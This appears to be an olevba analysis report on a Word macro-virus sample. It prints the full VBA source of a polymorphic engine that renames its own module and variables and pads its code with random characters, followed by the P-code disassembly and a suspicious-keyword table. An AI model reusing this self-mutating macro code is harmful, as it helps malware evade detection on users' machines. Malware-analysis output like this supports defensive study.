olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./VirTool.MSWord.MPPN2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO XXX.bas 
in file: ./VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/XXX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PolyNgine()
'Gen0
'MI_pirat's PolyMorphing Ngine
On Error Resume Next
If ThisDocument.Name <> NormalTemplate.Name Then
nr = 12
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "nuk"
suk(4) = "suk": suk(5) = "myRange": suk(6) = "strip": suk(7) = "ik"
suk(8) = "char1": suk(9) = "nur": suk(10) = "nam1": suk(11) = "nam2"
suk(12) = "kewl"
bkup = ActiveDocument.Content
'find and change the module name (100% poly)
For ik = 1 To ActiveDocument.VBProject.VBComponents.Count
nam1 = ActiveDocument.VBProject.VBComponents(ik).CodeModule.Lines(2, 1)
char1 = Mid(nam1, 1, 1)
nur = Len(nam1)
If nur >= 4 Then nam2 = Mid(nam1, 2, 3)
If (char1 = "'") And (nam2 = ActiveDocument.VBProject.VBComponents(ik).Name) Then
Randomize
nam2 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(ik).CodeModule.ReplaceLine 2, "'" + nam2
ActiveDocument.VBProject.VBComponents(ik).Name = nam2
kewl = ik
End If
Next ik
'copy this code to the doc
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize
ActiveDocument.Content = ""
nuk = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.CountOfLines
'copy this source into the doc (so I can modify it)
For ik = 1 To nuk
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(ik, 1)
Next ik
'now find the vars and poymorph 'em !
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set myRange = ActiveDocument.Content
myRange.Find.Execute FindText:=suk(ik), ReplaceWith:=strip, Replace:=wdReplaceAll
Next ik
'copy everythig back to its origin
nuk = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines 1, nuk
strip = ActiveDocument.Content
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.AddFromString strip
ActiveDocument.Content = ""
ActiveDocument.Content = bkup
mm:
If ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines 1, 1
GoTo mm
End If
'Add random chars
nr = ActiveDocument.VBProject.VBComponents.Item(kewl).CodeModule.CountOfLines
For ik = 2 To nr
nam1 = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(ik, 1)
nam2 = Mid(nam1, Len(nam1))
If (nam2 <> "!") And (Len(nam1) < 80) Then
char1 = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strip = nam1 + " '" + char1 + "!"
ActiveDocument.VBProject.VBComponents.Item(kewl).CodeModule.ReplaceLine ik, strip
End If
Next ik
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines nr, 1
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./VirTool.MSWord.MPPN2
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/XXX - 4939 bytes
' Line #0:
' 	FuncDefn (Sub nr())
' Line #1:
' 	QuoteRem 0x0000 0x0004 "Gen0"
' Line #2:
' 	QuoteRem 0x0000 0x001D "MI_pirat's PolyMorphing Ngine"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x000C 
' 	St suk 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld suk 
' 	RedimAs bkup 0x0001 (As String)
' Line #7:
' 	LitStr 0x0002 "nr"
' 	LitDI2 0x0001 
' 	ArgsSt bkup 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "bkup"
' 	LitDI2 0x0002 
' 	ArgsSt bkup 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "nuk"
' 	LitDI2 0x0003 
' 	ArgsSt bkup 0x0001 
' Line #8:
' 	LitStr 0x0003 "suk"
' 	LitDI2 0x0004 
' 	ArgsSt bkup 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "myRange"
' 	LitDI2 0x0005 
' 	ArgsSt bkup 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "strip"
' 	LitDI2 0x0006 
' 	ArgsSt bkup 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0002 "ik"
' 	LitDI2 0x0007 
' 	ArgsSt bkup 0x0001 
' Line #9:
' 	LitStr 0x0005 "char1"
' 	LitDI2 0x0008 
' 	ArgsSt bkup 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "nur"
' 	LitDI2 0x0009 
' 	ArgsSt bkup 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "nam1"
' 	LitDI2 0x000A 
' 	ArgsSt bkup 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "nam2"
' 	LitDI2 0x000B 
' 	ArgsSt bkup 0x0001 
' Line #10:
' 	LitStr 0x0004 "kewl"
' 	LitDI2 0x000C 
' 	ArgsSt bkup 0x0001 
' Line #11:
' 	Ld ActiveDocument 
' 	MemLd NFLM1 
' 	St ik 
' Line #12:
' 	QuoteRem 0x0000 0x002B "find and change the module name (100% poly)"
' Line #13:
' 	StartForVariable 
' 	Ld nam1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #14:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld nam1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St char1 
' Line #15:
' 	Ld char1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St nur 
' Line #16:
' 	Ld char1 
' 	FnLen 
' 	St nam2 
' Line #17:
' 	Ld nam2 
' 	LitDI2 0x0004 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld char1 
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	St kewl 
' 	EndIf 
' Line #18:
' 	Ld nur 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld kewl 
' 	Ld nam1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #19:
' 	ArgsCall Read 0x0000 
' Line #20:
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	St kewl 
' Line #21:
' 	LitDI2 0x0002 
' 	LitStr 0x0001 "'"
' 	Ld kewl 
' 	Add 
' 	Ld nam1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall TUMM1 0x0002 
' Line #22:
' 	Ld kewl 
' 	Ld nam1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #23:
' 	Ld nam1 
' 	St nuk 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld nam1 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	QuoteRem 0x0000 0x0019 "copy this code to the doc"
' Line #27:
' 	Ld RKBM1 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd WindowState 0x0001 
' 	MemSt wdWindowStateMinimize 
' Line #28:
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt NFLM1 
' Line #29:
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St strip 
' Line #30:
' 	QuoteRem 0x0000 0x0032 "copy this source into the doc (so I can modify it)"
' Line #31:
' 	StartForVariable 
' 	Ld nam1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld strip 
' 	For 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd NFLM1 
' 	Ld nam1 
' 	LitDI2 0x0001 
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld ActiveDocument 
' 	MemSt NFLM1 
' Line #33:
' 	StartForVariable 
' 	Ld nam1 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	QuoteRem 0x0000 0x0024 "now find the vars and poymorph 'em !"
' Line #35:
' 	StartForVariable 
' 	Ld nam1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld suk 
' 	For 
' Line #36:
' 	ArgsCall Read 0x0000 
' Line #37:
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	LitStr 0x0002 "M1"
' 	Add 
' 	St myRange 
' Line #38:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd NFLM1 
' 	Set id_034A 
' Line #39:
' 	Ld nam1 
' 	ArgsLd bkup 0x0001 
' 	ParamNamed ReplaceWith 
' 	Ld myRange 
' 	ParamNamed Replace 
' 	Ld AddFromString 
' 	ParamNamed wdReplaceAll 
' 	Ld id_034A 
' 	MemLd Execute 
' 	ArgsMemCall FindText 0x0003 
' Line #40:
' 	StartForVariable 
' 	Ld nam1 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	QuoteRem 0x0000 0x0021 "copy everythig back to its origin"
' Line #42:
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St strip 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld strip 
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd NFLM1 
' 	St myRange 
' Line #45:
' 	Ld myRange 
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall mm 0x0001 
' Line #46:
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt NFLM1 
' Line #47:
' 	Ld ik 
' 	Ld ActiveDocument 
' 	MemSt NFLM1 
' Line #48:
' 	Label wdWindowStateMaximize 
' Line #49:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ne 
' 	IfBlock 
' Line #50:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	GoTo wdWindowStateMaximize 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	QuoteRem 0x0000 0x0010 "Add random chars"
' Line #54:
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St suk 
' Line #55:
' 	StartForVariable 
' 	Ld nam1 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld suk 
' 	For 
' Line #56:
' 	Ld nam1 
' 	LitDI2 0x0001 
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St char1 
' Line #57:
' 	Ld char1 
' 	Ld char1 
' 	FnLen 
' 	ArgsLd Mid$ 0x0002 
' 	St kewl 
' Line #58:
' 	Ld kewl 
' 	LitStr 0x0001 "!"
' 	Ne 
' 	Paren 
' 	Ld char1 
' 	FnLen 
' 	LitDI2 0x0050 
' 	Lt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0078 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0078 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	St nur 
' Line #60:
' 	Ld char1 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld nur 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	St myRange 
' Line #61:
' 	Ld nam1 
' 	Ld myRange 
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall TUMM1 0x0002 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	StartForVariable 
' 	Ld nam1 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	Ld suk 
' 	LitDI2 0x0001 
' 	Ld nuk 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #65:
' 	Ld XXX 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd WindowState 0x0001 
' 	MemSt wdWindowStateMinimize 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

